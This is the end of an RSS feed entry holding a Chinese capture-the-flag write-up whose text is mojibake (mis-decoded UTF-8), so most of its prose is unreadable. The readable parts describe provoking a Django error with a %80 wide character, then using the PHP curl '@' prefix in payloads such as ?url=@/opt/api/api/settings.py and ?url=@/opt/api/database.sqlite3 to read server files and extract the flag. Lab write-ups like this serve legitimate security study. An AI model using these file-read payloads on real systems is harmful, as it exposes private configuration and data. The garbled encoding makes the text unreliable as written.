&lt;li&gt;çœ‹ wp å¾—çŸ¥&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;æœªè¿‡æ»¤å­—ç¬¦åœ¨ url æ ä¸Šä¼šè¢«è¿›è¡Œ url ç¼–ç &lt;br&gt;
åœ¨ url æ æµ‹è¯•å®½å­—ç¬¦ï¼Œå³ ascii ç è¶…è¿‡ 127 çš„ url ç¼–ç å³å¯ï¼Œä¹Ÿå°±æ˜¯ %81-% ef&lt;br&gt;
 å‘ç°ä»»æ„ä¸€ä¸ªå®½å­—ç¬¦ï¼Œéƒ½ä¼šå‡ºç°æŠ¥é”™ä¿¡æ¯&lt;br&gt;
&lt;em&gt;è¿™é“é¢˜æœ‰å…³ä¸€ä¸ª djiango ç‰¹æ€§å’Œ php ç‰¹æ€§ï¼Œæ²¡çœ‹æ‡‚ã€‚&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;è§£é¢˜æ­¥éª¤ï¼š&lt;br&gt;
playload1ï¼š?url=%80, å‘ç°æŠ¥é”™ï¼Œurl ç¼–ç ä½¿ç”¨çš„æ˜¯ 16 è¿›åˆ¶ï¼Œ80 ä¹Ÿå°±æ˜¯ 128ï¼ŒASCII ç æ˜¯ä» 0-127ï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™ä¼šæŠ¥é”™ã€‚&lt;br&gt;
&lt;strong&gt;php ç‰¹æ€§&lt;/strong&gt;ï¼š&lt;br&gt;
WP å¾—çŸ¥ php çš„ curl ç»„ä»¶è¯·æ±‚åŠ ä¸Š @ä¼šè¯»å–æ–‡ä»¶ï¼Œè¯»å– settings.py æ–‡ä»¶è·å–æ•°æ®åº“åç§°&lt;/li&gt;
&lt;li&gt;æ„é€  playload2ï¼š&lt;br&gt;
?url=@/opt/api/api/settings.py &lt;em&gt;è¯»å–é…ç½®æ–‡ä»¶&lt;/em&gt;&lt;br&gt;
 Ctrl+f æœç´¢ database&lt;/li&gt;
&lt;li&gt;æ„é€  playload3ï¼š&lt;br&gt;
?url=@/opt/api/database.sqlite3&lt;br&gt;
 &lt;code&gt;æœç´¢flag/ctfå¯å¾—flag&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;æœ€åçš„flagç«Ÿç„¶ä¸åŒ…å«å‰é¢çš„A&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
    </channel>
</rss>
